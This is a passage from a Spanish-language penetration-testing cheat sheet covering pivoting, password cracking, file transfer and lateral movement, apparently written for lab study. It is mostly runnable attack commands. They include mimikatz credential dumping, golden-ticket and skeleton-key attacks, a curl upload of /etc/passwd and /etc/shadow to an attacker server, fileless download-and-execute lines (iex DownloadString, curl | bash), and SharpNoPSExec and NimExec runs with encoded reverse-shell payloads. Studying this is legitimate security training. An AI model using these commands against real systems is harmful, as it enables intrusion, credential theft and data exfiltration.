[Agent : user@target] » ifconfig
sudo ip r add 172.16.1.0/24 dev ligolo
[Agent : user@target] » start
```
##### Port Forwarding

```bash
[Agent : user@target] » listener_add --addr <RHOST>:<LPORT> --to <LHOST>:<LPORT> --tcp
```

###  6.3. <a name='ssh-tunneling'></a>SSH Tunneling

####  6.3.1. <a name='local-port-forwarding'></a>Local Port Forwarding

![SSH Tunneling](./img/Pivoting.png)

##### Máquina WEB

Desde la máquina web realizamos el Port Forwarding con SSH.

```bash
ssh -N -L 0.0.0.0:4455:172.16.50.10:445 <user>@10.10.100.20
```

En este caso, el puerto que queremos redireccionar es el `445` de la  máquina Windows **SHARES**.

####  6.3.2. <a name='dynamic-port-forwarding'></a>Dynamic Port Forwarding

![SSH Tunneling](./img/Pivoting.png)

##### Máquina WEB

```bash
ssh -N -D 0.0.0.0:9999 <user>@10.10.100.20
```

##### Kali

Agregamos la conexión al proxy en el archivo `proxychains4.conf` (Kali) en Parrot es `proxychains.conf`.

```bash
vim /etc/proxychains4.conf
socks5 192.168.50.10 9999
proxychains smbclient -p 4455 //172.16.50.10/<SHARE> -U <USERNAME> --password=<PASSWORD>
```

####  6.3.3. <a name='remote-port-forwarding'></a>Remote Port Forwarding

![Remote Port Forwarding](./img/remote_dynamic_port_forwarding.png)

*KALI <-> FIREWALL <-> WEB > DATABASE > SHARES*


##### Kali

```bash
sudo systemctl start ssh
sudo ss -tulpn
```

##### Máquina Web

```bash
ssh -N -R 127.0.0.1:2345:10.10.100.20:5432 kali@192.168.50.10
```

##### Kali

```bash
psql -h 127.0.0.1 -p 2345 -U postgres
```

####  6.3.4. <a name='remote-dynamic-port-forwarding'></a>Remote Dynamic Port Forwarding

![Remote Dynamic Port Forwarding](./img/remote_dynamic_port_forwarding.png)

*KALI <- FIREWALL <- WEB -> INTERNAL NETWORK*

##### Máquina Web

```bash
ssh -N -R 9998 kali@192.168.50.10
```

##### Kali

```bash
sudo ss -tulpn
vim /etc/proxychains4.conf
socks5 127.0.0.1 9998 # agregar esta linea

# Realizamos escaneos a través de proxychains
proxychains nmap -vvv -sT --top-ports=20 -Pn -n 10.10.100.20
```

###  6.4. <a name='sshuttle'></a>sshuttle

| Sistema             | IP             |
| ------------------- | -------------- |
| KALI                | 192.168.50.10  |
| WEB                 | 192.168.100.10 |
| WINDOWS JUMP SERVER | 192.168.100.20 |
| DATABASE            | 10.10.100.20   |
| WINDOWS - SHARES    | 172.16.50.10   |

*KALI -> WEB -> INTERNAL NETWORK*

##### Máquina Web

```bash
socat TCP-LISTEN:2222,fork TCP:10.10.100.20:22
```

##### Kali

```bash
sshuttle -r <user>@192.168.100.10:2222 10.10.100.0/24 172.16.50.0/24
smbclient -L //172.16.50.10/ -U <user> --password=<password>
```

###  6.5. <a name='ssh.exe'></a>ssh.exe

| Sistema             | IP             |
| ------------------- | -------------- |
| KALI                | 192.168.50.10  |
| WEB                 | 192.168.100.10 |
| WINDOWS JUMP SERVER | 192.168.100.20 |
| DATABASE            | 10.10.100.20   |
| WINDOWS - SHARES    | 172.16.50.10   |

*KALI <- FIREWALL <- WINDOWS JUMP SERVER -> INTERNAL NETWORK*

##### Kali

```bash
sudo systemctl start ssh
xfreerdp /u:<USERNAME> /p:<PASSWORD> /v:192.168.100.20
```

##### Windows Jump Server

```powershell
where ssh
C:\Windows\System32\OpenSSH\ssh.exe
C:\Windows\System32\OpenSSH> ssh -N -R 9998 <USERNAME>@192.168.50.10
```

##### Kali

```bash
ss -tulpn
vim /etc/proxychains4.conf
socks5 127.0.0.1 9998  # agregar esta linea

proxychains psql -h 10.10.100.20 -U postgres
```

###  6.6. <a name='plink'></a>Plink

| Sistema             | IP             |
| ------------------- | -------------- |
| KALI                | 192.168.50.10  |
| WEB                 | 192.168.100.10 |
| WINDOWS JUMP SERVER | 192.168.100.20 |
| DATABASE            | 10.10.100.20   |
| WINDOWS - SHARES    | 172.16.50.10   |

*KALI <- FIREWALL <- WINDOWS JUMP SERVER*

##### Kali

```bash
find / -name plink.exe 2>/dev/null
/usr/share/windows-resources/binaries/plink.exe
```

##### Windows Jump Server

```powershell
plink.exe -ssh -l <USERNAME> -pw <PASSWORD> -R 127.0.0.1:9833:127.0.0.1:3389 192.168.50.10
```

##### Kali

```bash
ss -tulpn
xfreerdp /u:<USERNAME> /p:<PASSWORD> /v:127.0.0.1:9833
```

###  6.7. <a name='netsh'></a>Netsh

| Sistema             | IP             |
| ------------------- | -------------- |
| KALI                | 192.168.50.10  |
| WEB                 | 192.168.100.10 |
| WINDOWS JUMP SERVER | 192.168.100.20 |
| DATABASE            | 10.10.100.20   |
| WINDOWS - SHARES    | 172.16.50.10   |


*KALI <- FIREWALL <- WINDOWS JUMP SERVER -> DATABASE*

##### Kali

```bash
xfreerdp /u:<USERNAME> /p:<PASSWORD> /v:192.168.100.20
```

##### Windows Jump Server

```powershell
netsh interface portproxy add v4tov4 listenport=2222 listenaddress=192.168.50.10 connectport=22 connectaddress=10.10.100.20
netstat -anp TCP | findstr "2222"
netsh interface portproxy show all
netsh advfirewall firewall add rule name="port_forward_ssh_2222" protocol=TCP dir=in localip=192.168.50.10 localport=2222 action=allow
```

##### Kali

```bash
sudo nmap -sS 192.168.50.10 -Pn -n -p2222
ssh database_admin@192.168.50.10 -p2222
```

##### Windows Jump Server

```powershell
netsh advfirewall firewall delete rule name="port_forward_ssh_2222"
netsh interface portproxy del v4tov4 listenport=2222 listenaddress=192.168.50.10
```

##  7. <a name='passwords-attacks'></a>Passwords Attacks

###  7.1. <a name='fcrack'></a>fcrack

```bash
fcrackzip -u -D -p /ruta/de/la/wordlist/wordlist.txt <FILE>.zip
```

###  7.2. <a name='group-policy-preferences-(gpp)'></a>Group Policy Preferences (GPP)

####  7.2.1. <a name='gpp-decrypt'></a>gpp-decrypt

```bash
python3 gpp-decrypt.py -f Groups.xml
python3 gpp-decrypt.py -c edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ
```

###  7.3. <a name='hashcat'></a>Hashcat

```bash
hashcat -m 0 hash.txt /ruta/de/la/wordlist/wordlist.txt           # MD5
hashcat -m 100 hash.txt /ruta/de/la/wordlist/wordlist.txt         # SHA-1
hashcat -m 900 hash.txt /ruta/de/la/wordlist/wordlist.txt         # MD4
hashcat -m 1400 hash.txt /ruta/de/la/wordlist/wordlist.txt        # SHA256
hashcat -m 3200 hash.txt /ruta/de/la/wordlist/wordlist.txt        # BCRYPT
hashcat -m 1000 hash.txt /ruta/de/la/wordlist/wordlist.txt        # NTLM
hashcat -m 5600 hash.txt /ruta/de/la/wordlist/wordlist.txt        # NTMLv2
hashcat -m 1800 hash.txt /ruta/de/la/wordlist/wordlist.txt        # SHA512
hashcat -m 160 hash.txt /ruta/de/la/wordlist/wordlist.txt         # HMAC-SHA1
hashcat -m 160 hash.txt /ruta/de/la/wordlist/wordlist.txt         # HMAC-SHA1
hashcat -m 18200 -a 0 <FILE> /ruta/de/la/wordlist/wordlist.txt    # ASPREPRoast 
hashcat -m 13100 --force <FILE> /ruta/de/la/wordlist/wordlist.txt # Kerberoasting 
hashcat -a 0 -m 0 hash.txt SecLists/Passwords/xato-net-10-million-passwords-1000000.txt -O --force
hashcat -O -m 500 -a 3 -1 ?l -2 ?d -3 ?u  --force hash.txt ?3?3?1?1?1?1?2?3
```

```bash
/usr/share/wordlists/fasttrack.txt
/usr/share/hashcat/rules/best64.rule
```

####  7.3.1. <a name='reglas-personalizadas'></a>Reglas personalizadas

> https://hashcat.net/wiki/doku.php?id=rule_based_attack

##### Agregar 1 a cada contraseña

```bash
echo \$1 > <FILE>.rule
```

##### Poner en Mayúscula la primera letra

```bash
$1
c
```

###### No agregue nada, un 1 o un ! a una lista de palabras existente

```bash
:
$1
$!
```

###### Regla para letras mayúsculas, valores numéricos y caracteres especiales

- `$1` agrega un "1"
- `$2` agrega un "2"
- `$3` agrega un "3"
- `c` Pone en mayúscula la primera letra y en minúscula el resto.

```
$1 c $!
$2 c $!
$1 $2 $3 c $!
```
###### Vista previa de la regla

```bash
hashcat -r <FILE>.rule --stdout <FILE>.txt
```

###  7.4. <a name='hydra'></a>Hydra

```bash
hydra <RHOST> -l <USERNAME> -p <PASSWORD> <PROTOCOL>
hydra <RHOST> -L <users.txt> -P <passwords.txt> <PROTOCOL>
hydra <RHOST> -C /ruta/de/la/wordlist/wordlist.txt ftp
hydra -l <USERNAME> -P <PASSWORDS> <TARGET> <SERVICE> -s <PORT>
hydra -l admin -P /usr/share/wordlists/rockyou.txt <RHOST> http-post-form "/login/:user=^USER^&pass=^PASS^:Invalid password"
```

###  7.5. <a name='john'></a>John

```bash
keepass2john <FILE>
ssh2john id_rsa > <FILE>
zip2john <FILE> > <FILE>
john <FILE> --wordlist=/ruta/de/la/wordlist/wordlist.txt --format=crypt
john <FILE> --rules --wordlist=/ruta/de/la/wordlist/wordlist.txt
john --show <FILE>

# /etc/passwd - /etc/shadow
unshadow passwd shadow > hashes
john --wordlist-/usr/share/wordlists/rockyou.txt hashes
```

###  7.6. <a name='lazagne'></a>LaZagne

```bash
laZagne.exe all
```

###  7.7. <a name='mimikatz'></a>Mimikatz

[Mimikatz](https://github.com/gentilkiwi/mimikatz) es una herramienta que permite extraer contraseñas en texto claro, hash, código PIN y tickets kerberos de la memoria. A su vez, también puede realizar pass-the-hash, pass-the-ticket o construir Golden tickets.

```bash
# Comandos comunes
token::elevate
token::revert
vault::cred
vault::list
lsadump::sam
lsadump::secrets
lsadump::cache
lsadump::dcsync /<USERNAME>:<DOMAIN>\krbtgt /domain:<DOMAIN>

# Dump Hashes
.\mimikatz.exe
sekurlsa::minidump /users/admin/Desktop/lsass.DMP
sekurlsa::LogonPasswords

# Pass The Ticket
.\mimikatz.exe
sekurlsa::tickets /export
kerberos::ptt [0;76126]-2-0-40e10000-Administrator@krbtgt-<RHOST>.LOCAL.kirbi
klist
dir \\<RHOST>\admin$

# Golden Ticket
.\mimikatz.exe
privilege::debug
lsadump::lsa /inject /name:krbtgt
kerberos::golden /user:Administrator /domain:controller.local /sid:S-1-5-21-849420856-2351964222-986696166 /krbtgt:5508500012cc005cf7082a9a89ebdfdf /id:500
misc::cmd
klist
dir \\<RHOST>\admin$

# Skeleton Key
privilege::debug
misc::skeleton
net use C:\\<RHOST>\admin$ /user:Administrator mimikatz
dir \\<RHOST>\c$ /user:<USERNAME> mimikatz
```

###  7.8. <a name='pypykatz'></a>pypykatz

```bash
pypykatz lsa minidump lsass.dmp
pypykatz registry --sam sam system
```

##  8. <a name='transferencia-de-archivos'></a>Transferencia de Archivos

###  8.1. <a name='windows-1'></a>Windows

Diferentes utilidades para las operaciones de transferencia de archivos en Windows.

####  8.1.1. <a name='operaciones-de-descarga'></a>Operaciones de Descarga

##### Codificación y Decodificación PowerShell Base64

###### Atacante

```bash
cat test.txt | base64 -w 0; echo
SGVsbG8gV29ybGQhCg==
```

```bash
md5sum test.txt
8ddd8be4b179a529afa5f2ffae4b9858  test.txt
```

###### Máquina Víctima (Windows)

```powershell
[IO.File]::WriteAllBytes("C:\temp\test.txt", [Convert]::FromBase64String("SGVsbG8gV29ybGQhCg=="))
```

Confirmación de la coincidencia de hashes MD5

```powershell
Get-FileHash C:\temp\test.txt -Algorithm md5

Algorithm   Hash                               Path
---------   ----                               ----
MD5         8DDD8BE4B179A529AFA5F2FFAE4B9858   C:\temp\test.txt
```

##### System.Net.WebClient
PowerShell ofrece muchas opciones de transferencia de archivos. En cualquier versión de PowerShell, la clase System.Net.WebClient se puede utilizar para descargar un archivo HTTP, HTTPS o FTP. La siguiente tabla describe los métodos de WebClient para descargar datos de un recurso:


| **Método**                                                                                                               | **Descripción**                                                                                                             |
| ------------------------------------------------------------------------------------------------------------------------ | --------------------------------------------------------------------------------------------------------------------------- |
| [OpenRead](https://docs.microsoft.com/en-us/dotnet/api/system.net.webclient.openread?view=net-6.0)                       | Devuelve los datos de un recurso como [Stream](https://docs.microsoft.com/en-us/dotnet/api/system.io.stream?view=net-6.0) . |
| [OpenReadAsync](https://docs.microsoft.com/en-us/dotnet/api/system.net.webclient.openreadasync?view=net-6.0)             | Devuelve los datos de un recurso sin bloquear el hilo de llamada.                                                           |
| [DownloadData](https://docs.microsoft.com/en-us/dotnet/api/system.net.webclient.downloaddata?view=net-6.0)               | Descarga datos de un recurso y devuelve una matriz de bytes.                                                                |
| [DownloadDataAsync](https://docs.microsoft.com/en-us/dotnet/api/system.net.webclient.downloaddataasync?view=net-6.0)     | Descarga datos de un recurso y devuelve una matriz de bytes sin bloquear el hilo de llamada.                                |
| [DownloadFile](https://docs.microsoft.com/en-us/dotnet/api/system.net.webclient.downloadfile?view=net-6.0)               | Descarga datos de un recurso a un archivo local.                                                                            |
| [DownloadFileAsync](https://docs.microsoft.com/en-us/dotnet/api/system.net.webclient.downloadfileasync?view=net-6.0)     | Descarga datos de un recurso a un archivo local sin bloquear el hilo de llamada.                                            |
| [DownloadString](https://docs.microsoft.com/en-us/dotnet/api/system.net.webclient.downloadstring?view=net-6.0)           | Descarga una cadena de un recurso y devuelve una cadena.                                                                    |
| [DownloadStringAsync](https://docs.microsoft.com/en-us/dotnet/api/system.net.webclient.downloadstringasync?view=net-6.0) | Descarga una cadena de un recurso sin bloquear el hilo de llamada.                                                          |

##### DownloadFile

###### Atancate

```bash
python3 -m http.server 80
```

###### Máquina Víctima (Windows)

```powershell
(New-Object Net.WebClient).DownloadFile('<Target File URL>','<Output File Name>')

(New-Object Net.WebClient).DownloadFile('http://192.168.1.19/test.txt','C:\temp\test.txt')
```

##### DownloadFileAsync

###### Máquina Víctima (Windows)

```powershell
(New-Object Net.WebClient).DownloadFileAsync('<Target File URL>','<Output File Name>')

(New-Object Net.WebClient).DownloadFileAsync('http://192.168.1.19/test.txt','C:\temp\test.txt')

```

##### DownloadString

PowerShell también se puede utilizar para realizar ataques sin archivos. En lugar de descargar un script de PowerShell al disco, podemos ejecutarlo directamente en la memoria usando el cmdlet Invoke-Expression o el alias IEX.

```powershell
iex (New-Object Net.WebClient).DownloadString("http://192.168.1.19/script.ps1")
```

`IEX` también acepta entrada de tubería.

```powershell
(New-Object Net.WebClient).DownloadString("http://192.168.1.19/script.ps1") | iex
```

##### Invoke-WebRequest

A partir de PowerShell 3.0, el [cmdlet Invoke-WebRequest](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.utility/invoke-webrequest?view=powershell-7.5&viewFallbackFrom=powershell-7.2) también está disponible, pero es notablemente más lento a la hora de descargar archivos. Puedes usar los alias iwr, curl, y wget en lugar del nombre completo Invoke-WebRequest.

```powershell
Invoke-WebRequest "http://192.168.1.19/script.ps1" -OutFile script.ps1

iex (Invoke-WebRequest "http://192.168.1.19/script.ps1" -OutFile script.ps1)

Invoke-WebRequest "http://192.168.1.19/script.ps1" -OutFile script.ps1 | iex
```

####  8.1.2. <a name='smb'></a>SMB

##### Máquina atacante

Creamos un servidor SMB con `impacket-smbserver`.

```bash
impacket-smbserver share -smb2support /tmp/smbshare
```

##### copy

```powershell
copy \\192.168.220.133\share\nc.exe
```
> Las nuevas versiones de Windows bloquean el acceso de invitados no autenticados.

Para transferir archivos en este escenario, podemos establecer un nombre de usuario y contraseña usando nuestro servidor Impacket SMB y montar el servidor SMB en nuestra máquina de destino con Windows:

```bash
sudo impacket-smbserver share -smb2support /tmp/smbshare -user kali -password kali
```

```powershell
net use n: \\192.168.1.19\share /user:kali kali
```

####  8.1.3. <a name='ftp'></a>FTP

Otra forma de transferir archivos es mediante FTP (Protocolo de transferencia de archivos), que utiliza los puertos TCP/21 y TCP/20. Podemos utilizar el cliente FTP o PowerShell Net.WebClient para descargar archivos desde un servidor FTP.

Podemos configurar un Servidor FTP en nuestro host de ataque usando Python3 pyftpdlib módulo. Se puede instalar con el siguiente comando:

```bash
sudo pip3 install pyftpdlib
```

Configurar un servidor FTP Python3

```bash
sudo python3 -m pyftpdlib --port 21 -w
```

Una vez configurado el servidor FTP, podemos realizar transferencias de archivos utilizando el cliente FTP preinstalado desde Windows o PowerShell. Net.WebClient.

```powershell
(New-Object Net.WebClient).DownloadFile("ftp://192.168.1.19/test.txt", "C:\temp\test.txt")
```

Creamos un archivo de comando para el cliente FTP y descargamos el archivo de destino.

```powershell
C:\temp> echo open 192.168.1.19 > ftpcommand.txt
C:\temp> echo USER anonymous >> ftpcommand.txt
C:\temp> echo binary >> ftpcommand.txt
C:\temp> echo GET file.txt >> ftpcommand.txt
C:\temp> echo bye >> ftpcommand.txt
C:\temp> ftp -v -n -s:ftpcommand.txt
ftp> open 192.168.1.19
Log in with USER and PASS first.
ftp> USER anonymous

ftp> GET file.txt
ftp> bye

C:\htb>more file.txt
This is a test file
```

####  8.1.4. <a name='operaciones-de-subida'></a>Operaciones de Subida

##### Codificación y decodificación PowerShell Base64

###### Máquina Víctima (Windows)

```powershell
[Convert]::ToBase64String((Get-Content -Path "C:\temp\test.txt" -Encoding byte));
SGVsbG8gV29ybGQhCg==
```

###### Máquina atacante

```bash
echo "SGVsbG8gV29ybGQhCg==" | base64 -d;echo
```

##### PowerShell Web Uploads

PowerShell no tiene una función incorporada para operaciones de carga, pero podemos usar Invoke-WebRequest o Invoke-RestMethod para construir nuestra función de carga. También necesitaremos un servidor web que acepte cargas, lo cual no es una opción predeterminada en la mayoría de las utilidades de servidor web comunes.

Para nuestro servidor web, podemos usar [uploadserver](https://github.com/Densaugeo/uploadserver) , un módulo extendido del [módulo HTTP.server](https://docs.python.org/3/library/http.server.html) de Python , que incluye una página de carga de archivos.

```bash
sudo pip3 install uploadserver
python3 -m uploadserver
```

Script de PowerShell para cargar un archivo al servidor de carga de Python

```powershell
Invoke-FileUpload -Uri http://192.168.1.19:80/upload -File C:\Windows\System32\drivers\etc\hosts
```

##### PowerShell Base64 Web Upload

Otra forma de utilizar archivos codificados en PowerShell y base64 para operaciones de carga es mediante el uso `Invoke-WebRequest` o `Invoke-RestMethod` junto con Netcat. Usamos Netcat para escuchar en un puerto que especificamos y enviamos el archivo como petición POST. Finalmente, copiamos la salida y usamos la función de decodificación base64 para convertir la cadena base64 en un archivo.

```powershell
PS C:\temp> $b64 = [System.convert]::ToBase64String((Get-Content -Path 'C:\Windows\System32\drivers\etc\hosts' -Encoding Byte))
PS C:\temp> Invoke-WebRequest -Uri http://192.168.49.128:8000/ -Method POST -Body $b64
```

Captamos los datos base64 con Netcat y usamos la aplicación base64 con la opción de decodificación para convertir la cadena en el archivo.

```bash
nc -lnvp 8000
listening on [any] 8000 ...
connect to [192.168.1.19] from (UNKNOWN) [192.168.1.15] 62601
POST / HTTP/1.1
User-Agent: Mozilla/5.0 (Windows NT; Windows NT 10.0; en-US) WindowsPowerShell/5.1.22621.4111
Content-Type: application/x-www-form-urlencoded
Host: 192.168.1.19:8000
Content-Length: 1140
Connection: Keep-Alive

IyBDb3B5cmlnaHQgKGMpIDE5OTMtMjAwOSBNaWNyb3NvZnQgQ29ycC4NCiMNCiMgVGhpcyBpcyBhIHNhbXBsZSBIT1NUUyBmaWxlIHVzZWQgYnkgTWljcm9zb2Z0IFRDUC9JUCBmb3IgV2luZG93cy4NCiMNCiMgVGhpcyBmaWxlIGNvbnRhaW5zIHRoZSBtYXBwaW5ncyBvZiBJUCBhZGRyZXNzZXMgdG8gaG9zdCBuYW1lcy4gRWFjaA0KIyBlbnRyeSBzaG91bGQgYmUga2VwdCBvbiBhbiBpbmRpdmlkdWFsIGxpbmUuIFRoZSBJUCBhZGRyZXNzIHNob3VsZA0KIyBiZSBwbGFjZWQgaW4gdGhlIGZpcnN0IGNvbHVtbiBmb2xsb3dlZCBieSB0aGUgY29ycmVzcG9uZGluZyBob3N0IG5hbWUuDQojIFRoZSBJUCBhZGRyZXNzIGFuZCB0aGUgaG9zdCBuYW1lIHNob3VsZCBiZSBzZXBhcmF0ZWQgYnkgYXQgbGVhc3Qgb25lDQojIHNwYWNlLg0KIw0KIyBBZGRpdGlvbmFsbHksIGNvbW1lbnRzIChzdWNoIGFzIHRoZXNlKSBtYXkgYmUgaW5zZXJ0ZWQgb24gaW5kaXZpZHVhbA0KIyBsaW5lcyBvciBmb2xsb3dpbmcgdGhlIG1hY2hpbmUgbmFtZSBkZW5vdGVkIGJ5IGEgJyMnIHN5bWJvbC4NCiMNCiMgRm9yIGV4YW1wbGU6DQojDQojICAgICAgMTAyLjU0Ljk0Ljk3ICAgICByaGluby5hY21lLmNvbSAgICAgICAgICAjIHNvdXJjZSBzZXJ2ZXINCiMgICAgICAgMzguMjUuNjMuMTAgICAgIHguYWNtZS5jb20gICAgICAgICAgICAgICMgeCBjbGllbnQgaG9zdA0KDQojIGxvY2FsaG9zdCBuYW1lIHJlc29sdXRpb24gaXMgaGFuZGxlZCB3aXRoaW4gRE5TIGl0c2VsZi4NCiMJMTI3LjAuMC4xICAgICAgIGxvY2FsaG9zdA0KIwk6OjEgICAgICAgICAgICAgbG9jYWxob3N0DQoNCjEyNy4wLjAuMSBjcnlwdG9tYXRvci12YXVsdA0K
```

```bash
echo <base64> | base64 -d -w 0 > hosts
```

###  8.2. <a name='linux-1'></a>Linux

Diferentes utilidades para las operaciones de transferencia de archivos en Linux.

####  8.2.1. <a name='operaciones-de-descarga-1'></a>Operaciones de Descarga

##### Codificación/Decodificación Base64

###### Máquina atacante

```bash
cat test.txt | base64 -w 0; echo
SGVsbG8gV29ybGQhCg==
```

###### Máquina víctima

```bash
echo "SGVsbG8gV29ybGQhCg==" | base64 -d > test.txt
```

##### Descargas web con Wget y cURL

Dos de las utilidades más comunes en las distribuciones de Linux para interactuar con aplicaciones web son wget y curl. Estas herramientas están instaladas en muchas distribuciones de Linux.

Para descargar un archivo usando wget, necesitamos especificar la URL y la opción -O para establecer el nombre del archivo de salida.

###### Descargar un archivo usando wget

```bash
wget https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh -O /tmp/LinEnum.sh
```

###### Descargar un archivo usando cURL

cURL es muy similar a wget, pero la opción del nombre del archivo de salida es -o en minúscula.

```bash
curl https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh -o /tmp/LinEnum.sh
```

####  8.2.2. <a name='ataques-sin-archivos-usando-linux'></a>Ataques sin archivos usando Linux

##### Descarga sin archivos con cURL

```bash
curl https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh | bash
```

```bash
wget -qO- https://raw.githubusercontent.com/juliourena/plaintext/master/Scripts/helloworld.py | python3

Hello World!
```

####  8.2.3. <a name='descargar-con-bash-(/dev/tcp)'></a>Descargar con Bash (/dev/tcp)

También puede haber situaciones en las que ninguna de las herramientas de transferencia de archivos más conocidas esté disponible. Siempre que esté instalada la versión `2.04` o superior de Bash (compilada con `--enable-net-redirections`), el archivo de dispositivo integrado /dev/tcp se puede utilizar para descargas de archivos simples.

##### Máquina atacante

Creamos un servidor HTTP con Python.

```bash
python3 -m http.server 80
```

##### Máquina víctima

Nos conectamos al servidor web de destino

```bash
exec 3<>/dev/tcp/10.10.10.32/80
```

Realizamos la solicitud HTTP GET

```bash
echo -e "GET /test.txt HTTP/1.1\n\n">&3
```

Imprimimos la respuesta

```bash
cat <&3
```

####  8.2.4. <a name='descargas-ssh'></a>Descargas SSH

```bash
scp elliot@192.168.1.19:/root/myroot.txt . 
```

####  8.2.5. <a name='web-upload'></a>Web Upload

Podemos usar uploadserver , un módulo extendido de Python HTTP.Server módulo, que incluye una página de carga de archivos. Para este ejemplo de Linux, veamos cómo podemos configurar el `uploadserver` módulo a utilizar HTTPS para una comunicación segura.

Lo primero que debemos hacer es instalar el uploadserver módulo.

##### Iniciar servidor web

```bash
sudo python3 -m pip install --user uploadserver
```

Ahora necesitamos crear un certificado. En este ejemplo, utilizamos un certificado autofirmado.

Crear un certificado autofirmado

```bash
openssl req -x509 -out server.pem -keyout server.pem -newkey rsa:2048 -nodes -sha256 -subj '/CN=server'
```

El servidor web no debe alojar el certificado. Recomendamos crear un nuevo directorio para alojar el archivo en nuestro servidor web.

##### Iniciar servidor web

```bash
mkdir https && cd https

sudo python3 -m uploadserver 443 --server-certificate ~/server.pem
```

Ahora desde nuestra máquina comprometida, carguemos el /etc/passwd y /etc/shadow archivos.

##### Máquina Víctima (Linux)

```bash
curl -X POST https://192.168.49.128/upload -F 'files=@/etc/passwd' -F 'files=@/etc/shadow' --insecure
```

Usamos la opción `--insecure` porque utilizamos un certificado autofirmado en el que confiamos.

####  8.2.6. <a name='netcat'></a>Netcat

##### Máquina atacante

```bash
nc -l -p 4444 > output.txt
```

##### Máquina victima

```bash
nc -w 3 192.168.1.10 4444 < output.txt
```

####  8.2.7. <a name='método-alternativo-de-transferencia-de-archivos-web'></a>Método alternativo de transferencia de archivos web

##### Creación de un servidor web con Python3

```bash
python3 -m http.server
```

##### Creación de un servidor web con Python2.7

```bash
python2.7 -m SimpleHTTPServer
```

##### Creación de un servidor web con PHP

```bash
php -S 0.0.0.0:8000
```

##### Creación de un servidor web con Ruby

```bash
ruby -run -ehttpd . -p8000
php -S 0.0.0.0:8000
```

##### Descargamos el archivo

```bash
wget 192.168.1.19:8000/filetotransfer.txt
```

####  8.2.8. <a name='operaciones-de-subida-1'></a>Operaciones de Subida

##### SCP

```bash
scp /etc/passwd student@10.10.14.30:/home/student/
```

##  9. <a name='movimiento-lateral'></a>Movimiento Lateral

###  9.1. <a name='rdp'></a>RDP

####  9.1.1. <a name='xfreerdp-1'></a>xfreerdp

```bash
xfreerdp /u:'<USER>' /p:'<PASSWORD>' /d:hacklab.local /v:192.168.56.10 /dynamic-resolution /drive:.,linux /bpp:8 /compression -themes -wallpaper /clipboard /audio-mode:0 /auto-reconnect -glyph-cache
```

Parámetros:

- `/bpp:8`: Reduce la profundidad del color a 8 bits por píxel, disminuyendo la cantidad de datos transmitidos.
- `/compression`: Habilita la compresión para reducir la cantidad de datos enviados a través de la red.
- `-themes`: Desactiva los temas del escritorio para reducir los datos gráficos.
- `-wallpaper`: Desactiva el fondo de pantalla del escritorio para reducir aún más los datos gráficos.
- `/clipboard`: permite compartir el portapapeles entre las máquinas locales y remotas.
- `/audio-mode:0`: Desactiva la redirección de audio para ahorrar ancho de banda.
- `/auto-reconnect`: Se vuelve a conectar automáticamente si la conexión se interrumpe, lo que mejora la estabilidad de la sesión.
- `-glyph-cache`: permite el almacenamiento en caché de glifos (caracteres de texto) para reducir la cantidad de datos enviados para la representación de texto.

###  9.2. <a name='smb-1'></a>SMB

####  9.2.1. <a name='psexec'></a>PsExec

[PsExec](https://learn.microsoft.com/en-us/sysinternals/downloads/psexec) está incluido en el conjunto de herramientas Sysinternals de Microsoft, una colección de herramientas diseñadas para ayudar a los administradores en tareas de gestión del sistema. Esta herramienta facilita la ejecución remota de comandos y recupera la salida a través de un pipe con nombre utilizando el protocolo SMB, operando en el puerto TCP 445 y el puerto TCP 139.

```powershell
.\PsExec.exe \\MS02 -i -u HACKLAB.LOCAL\elliot -p Password123 cmd
```
####  9.2.2. <a name='sharpnopsexec'></a>SharpNoPSExec

[SharpNoPSExec](https://github.com/juliourena/SharpNoPSExec) es una herramienta diseñada para facilitar el movimiento lateral aprovechando los servicios existentes en un sistema de destino sin crear otros nuevos ni escribir en el disco, minimizando así el riesgo de detección. La herramienta consulta todos los servicios en la máquina de destino, identificando aquellos con un tipo de inicio configurado como deshabilitado o manual, estado actual de detenido y ejecutándose con privilegios de LocalSystem. Selecciona aleatoriamente uno de estos servicios y modifica temporalmente su ruta binaria para apuntar a una carga útil elegida por el atacante. Tras la ejecución, `SharpNoPSExec` espera aproximadamente 5 segundos antes de restaurar la configuración original del servicio, devolviendo el servicio a su estado anterior. Este enfoque no solo proporciona un shell, sino que también evita la creación de nuevos servicios, lo que podría ser detectado por los sistemas de monitoreo de seguridad.

Nos ponemos en escucha con Netcat

```bash
rlwrap nc -lnvp 4444
```

Ejecutamos `SharpNoPSExec`

```powershell
.\SharpNoPSExec.exe --target=192.168.56.10 --payload="c:\windows\system32\cmd.exe /c powershell -exec bypass -nop -e ...SNIP...AbwBzAGUAKAApAA=="
```

> Creamos un shell en [revshells.com](https://www.revshells.com/)

####  9.2.3. <a name='nimexec'></a>NimExec

[NimExec](https://github.com/frkngksl/NimExec) es una herramienta de ejecución remota de comandos sin archivos que utiliza el Protocolo de Control de Servicios Remotos (MS-SCMR). Manipula la ruta binaria de un servicio con privilegios de LocalSystem para ejecutar comandos en la máquina objetivo y luego restaura la configuración original. Funciona enviando paquetes RPC personalizados a través de SMB y el pipe svcctl, autenticándose mediante un hash NTLM. Al evitar funciones específicas del sistema operativo y aprovechar la compilación cruzada de Nim, NimExec es compatible con múltiples sistemas operativos, ofreciendo una solución versátil y eficiente.

Nos ponemos en escucha con Netcat

```bash
rlwrap nc -lnvp 4444
```

Ejecutamos NimExec

```powershell
.\NimExec -u <user> -d hacklab.local -p <password> -t 192.168.56.10 -c "cmd.exe /c powershell -e JABjAGwAaQBlAG...SNIP...AbwBzAGUAKAApAA==" -v
```

####  9.2.4. <a name='psexec.py'></a>psexec.py

```bash
impacket-psexec HACKLAB.LOCAL/<USER>:'<PASSWORD>'@192.168.56.10
```

####  9.2.5. <a name='smbexec.py'></a>smbexec.py

```bash
impacket-smbexec HACKLAB.LOCAL/<USER>:'<PASSWORD>'@192.168.56.10
```

####  9.2.6. <a name='atexec.py'></a>atexec.py

El [script atexec.py](https://github.com/fortra/impacket/blob/master/examples/atexec.py) utiliza el servicio Programador de tareas de Windows, al que se puede acceder a través de la tubería SMB `atsvc`. Nos permite agregar de forma remota una tarea al programador, que se ejecutará en el momento designado.

